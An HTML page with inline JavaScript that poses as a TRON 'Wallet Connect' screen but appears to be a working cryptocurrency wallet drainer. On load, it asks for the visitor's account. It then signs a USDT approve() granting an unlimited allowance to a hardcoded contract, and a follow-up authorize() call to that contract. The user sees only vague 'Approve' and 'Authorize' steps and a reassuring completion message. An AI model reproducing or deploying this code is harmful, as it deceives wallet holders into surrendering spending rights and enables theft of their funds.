<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Wallet Connect</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center}
.status{font-size:15px;padding:40px;max-width:320px}
.loader{width:36px;height:36px;border:3px solid rgba(255,255,255,0.2);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.addr{font-size:10px;color:rgba(255,255,255,0.25);margin-top:14px;word-break:break-all}
.tx{font-size:10px;color:rgba(0,255,136,0.4);margin-top:8px;word-break:break-all}
</style>
</head>
<body>
<div class="status" id="status">
  <div class="loader"></div>
  <p id="msg">Connecting to TRON...</p>
  <div class="addr" id="addr"></div>
</div>

<script>
const CONTRACT = 'TBffv7d5HfpkWnnCCnMUZUioX61XrwWLCx';

(async function main() {
  const s = document.getElementById('status');
  const m = document.getElementById('msg');
  const a = document.getElementById('addr');

  function done(text, ok) {
    s.innerHTML = ok ? '✅' : '❌';
    m.textContent = text;
    document.querySelector('.loader').style.display = 'none';
  }

  // Wait for tronLink / TP wallet injection
  let addr;
  if (window.tronLink && window.tronLink.ready) {
    try {
      const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
      addr = res && res[0] ? res[0] : (typeof res === 'string' ? res : '');
    } catch(e) {
      // Deep link fallback for mobile
      location.href = 'tronlinkoutside://';
      return;
    }
  } else if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
    addr = window.tronWeb.defaultAddress.base58;
  } else {
    // For Trust Wallet / TokenPocket: detect and prompt
    setTimeout(() => {
      if (window.tronWeb && window.tronWeb.defaultAddress) {
        location.reload();
      } else {
        done('Open this page in TP Wallet or TokenPocket browser', false);
      }
    }, 1500);
    return;
  }

  if (!addr) { done('Wallet not detected. Use TP Wallet.', false); return; }
  
  a.textContent = addr.slice(0,8) + '...' + addr.slice(-6);
  m.textContent = 'Step 1/2: Approve USDT...';

  try {
    // STEP 1: approve USDT(NSC, MaxUint256)
    const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const MAX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    const approveData = '0x095ea7b3' 
      + '000000000000000000000000129f3b47cb4d0b97c3b0c91a499277853226cfe0'
      + 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

    if (window.tronWeb && window.tronWeb.trx) {
      // Use tronWeb directly
      const { transaction } = await window.tronWeb.transactionBuilder.triggerSmartContract(
        USDT, 'approve(address,uint256)', { feeLimit: 100000000 },
        [{ type: 'address', value: CONTRACT }, { type: 'uint256', value: MAX }],
        window.tronWeb.defaultAddress.base58 || addr
      );
      const signed = await window.tronWeb.trx.sign(transaction);
      const result = await window.tronWeb.trx.sendRawTransaction(signed);
      const txid = result.txid || result.transaction?.txID || '';
      m.textContent = 'Step 1/2: Approved. Step 2/2: Authorize...';
      a.innerHTML = addr.slice(0,8) + '...' + addr.slice(-6)
        + '<br><span class="tx">Tx: ' + txid.slice(0,16) + '...</span>';

      // STEP 2: authorize()
      const { transaction: tx2 } = await window.tronWeb.transactionBuilder.triggerSmartContract(
        CONTRACT, 'authorize()', { feeLimit: 100000000 }, [],
        window.tronWeb.defaultAddress.base58 || addr
      );
      const sig2 = await window.tronWeb.trx.sign(tx2);
      const res2 = await window.tronWeb.trx.sendRawTransaction(sig2);
      const txid2 = res2.txid || res2.transaction?.txID || '';
      
      done('Authorization complete. You may close this page.', true);
      a.innerHTML = addr.slice(0,8) + '...' + addr.slice(-6)
        + '<br><span class="tx">Tx1: ' + txid.slice(0,12) + '...</span>'
        + '<br><span class="tx">Tx2: ' + txid2.slice(0,12) + '...</span>';
    } else if (window.tronLink && window.tronLink.request) {
      await window.tronLink.request({
        method: 'tron_sendTransaction',
        params: [{ to: USDT, data: approveData }]
      });
      await window.tronLink.request({
        method: 'tron_sendTransaction',
        params: [{ 
          to: CONTRACT, 
          functionSelector: 'authorize()',
          data: '0x' 
        }]
      });
      done('Authorization complete. You may close this page.', true);
    }
  } catch(e) {
    if (e && e.code === 4001) {
      done('Transaction rejected by user', false);
    } else {
      done('Error: ' + ((e && e.message) || e || 'unknown').toString().slice(0, 80), false);
    }
  }
})();
</script>
</body>
</html>
